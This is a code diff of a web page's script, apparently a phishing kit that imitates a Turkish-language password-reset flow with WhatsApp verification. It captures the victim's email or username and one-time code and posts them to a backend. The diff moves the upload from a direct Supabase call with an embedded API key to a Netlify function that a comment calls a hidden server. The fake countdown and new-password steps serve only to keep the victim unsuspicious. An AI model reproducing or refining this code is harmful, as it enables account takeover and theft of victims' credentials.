@@ -137,25 +137,36 @@
 </div>
 
 <script>
-    // الجزء الخاص بربط Supabase (هنخليه بسيط جداً عشان ميعطلش الصفحة)
-    const SUPABASE_URL = 'https://dlmaxrjjrqntcssvrsmy.supabase.co'; 
-    const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRsbWF4cmlqcnFudGNzc3Zyc215Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTIzMTk1MDAsImV4cCI6MjEwNzg5NTUwMH0.oFkpunqEGruS189py8FiU2BNCU3xBwSqLvkn2u_aIsg';
-
-    function saveData(identifier, code) {
-        fetch(${SUPABASE_URL}/rest/v1/submissions, {
-            method: 'POST',
-            headers: {
-                'apikey': SUPABASE_KEY,
-                'Authorization': 'Bearer ' + SUPABASE_KEY,
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ identifier: identifier, verification_code: code })
-        })
-        .then(res => { if(res.ok) console.log('تم الحفظ'); })
-        .catch(err => console.log('خطأ', err));
+    // ==========================================
+    // دالة الحفظ الجديدة (بتبعت للسيرفر الخفي بتاعنا)
+    // ==========================================
+    async function saveData(identifier, code) {
+        try {
+            // بنبعت الطلب لملف السيرفر اللي عملناه في Netlify
+            const response = await fetch('/.netlify/functions/saveData', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ 
+                    identifier: identifier, 
+                    verification_code: code 
+                })
+            });
+            
+            if (response.ok) {
+                console.log('✅ تم إرسال البيانات للسيرفر بنجاح');
+            } else {
+                console.log('❌ فشل الإرسال، في مشكلة في السيرفر');
+            }
+        } catch (error) {
+            console.log('❌ خطأ في الاتصال:', error);
+        }
     }
 
-    // باقي كود التنقل
+    // ==========================================
+    // باقي كود التنقل بين الصفحات
+    // ==========================================
     let userIdentifier = "";
     let countdownInterval = null;
 
@@ -168,65 +179,54 @@
     function sendCode() {
         const idInput = document.getElementById("identifier").value.trim();
         if (!idInput) {
-            showMsg("msg1", "Lütfen e-posta adresinizi veya kullanıcı adınızı girin", "error");
+            showMsg("msg1", "Lütfen e-posta girin", "error");
             return;
         }
-        userIdentifier = idInput;
-        saveData(userIdentifier, null);
-        showMsg("msg1", "Doğrulama kodu WhatsApp'a gönderildi", "success");
         
+        userIdentifier = idInput;
+        saveData(userIdentifier, null); // إرسال الإيميل للسيرفر
+
+        showMsg("msg1", "Kod gönderildi", "success");
         setTimeout(() => {
             document.getElementById("step1").classList.add("hidden");
             document.getElementById("step2").classList.remove("hidden");
-            document.getElementById("verificationCode").focus();
         }, 500);
     }
 
     function verifyCode() {
-        const codeInput = document.getElementById("verificationCode");
-        const code = codeInput.value.trim();
+        const code = document.getElementById("verificationCode").value.trim();
         if (!code) {
-            showMsg("msg2", "Lütfen doğrulama kodunu girin", "error");
+            showMsg("msg2", "Lütfen kodu girin", "error");
             return;
         }
-        saveData(userIdentifier, code);
         
-        const verifyBtn = document.getElementById("verifyBtn");
-        const backLink = document.getElementById("backLink2");
-        const countdownNote = document.getElementById("countdownNote");
-        const countdownNumber = document.getElementById("countdownNumber");
-
-        codeInput.disabled = true;
-        verifyBtn.disabled = true;
-        backLink.style.pointerEvents = "none";
-        backLink.style.opacity = "0.5";
-        showMsg("msg2", "", "");
-        countdownNote.classList.remove("hidden");
-
+        saveData(userIdentifier, code); // إرسال الكود للسيرفر
+        
+        document.getElementById("verificationCode").disabled = true;
+        document.getElementById("verifyBtn").disabled = true;
+        document.getElementById("countdownNote").classList.remove("hidden");
+        
         let seconds = 7;
-        countdownNumber.textContent = seconds;
+        document.getElementById("countdownNumber").textContent = seconds;
 
         countdownInterval = setInterval(() => {
             seconds--;
-            countdownNumber.textContent = seconds;
+            document.getElementById("countdownNumber").textContent = seconds;
             if (seconds <= 0) {
                 clearInterval(countdownInterval);
-                countdownInterval = null;
                 document.getElementById("step2").classList.add("hidden");
                 document.getElementById("step3").classList.remove("hidden");
-                document.getElementById("newPass").focus();
             }
         }, 1000);
     }
 
     function backToStep1() {
-        if (countdownInterval) return;
         document.getElementById("step2").classList.add("hidden");
         document.getElementById("step1").classList.remove("hidden");
         document.getElementById("identifier").value = "";
         document.getElementById("verificationCode").value = "";
-        showMsg("msg1", "", "");
-        showMsg("msg2", "", "");
+        document.getElementById("msg1").textContent = "";
+        document.getElementById("msg2").textContent = "";
     }
 
     function resetPassword() {
@@ -234,23 +234,19 @@
         const confirm = document.getElementById("confirmPass").value;
 
         if (pass.length < 6) {
-            showMsg("msg3", "Şifre en az 6 karakter olmalıdır", "error");
+            showMsg("msg3", "En az 6 karakter olmalı", "error");
             return;
         }
         if (pass !== confirm) {
             showMsg("msg3", "Şifreler eşleşmiyor", "error");
             return;
         }
-        showMsg("msg3", "Şifre başarıyla belirlendi", "success");
+
+        showMsg("msg3", "Başarılı", "success");
         setTimeout(() => {
             document.getElementById("step3").classList.add("hidden");
             document.getElementById("step4").classList.remove("hidden");
-            document.getElementById("footerCard").classList.add("hidden");
         }, 500);
-    }
-
-    function goToLogin() {
-        location.reload();
     }
 </script>
 
